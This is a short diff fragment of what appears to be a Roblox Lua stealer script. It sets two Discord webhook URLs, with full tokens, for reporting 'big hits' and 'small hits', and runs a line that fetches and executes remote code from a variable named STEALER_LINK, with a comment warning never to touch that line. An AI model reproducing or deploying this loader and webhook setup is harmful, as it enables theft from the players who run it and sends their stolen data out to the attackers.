@@ -10,4 +10,3 @@ BigHitsWebhook = "https://discord.com/api/webhooks/1371622669027643463/7c4ByqT7-
 SmallHitsWebhook = "https://discord.com/api/webhooks/1371622489519558776/5jbG56Rzo4efBeVYT69uGNcQd2Yasfeqcv8-JZMftTAxdt19DnAzJNx86Len7nd84d_a"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
-```
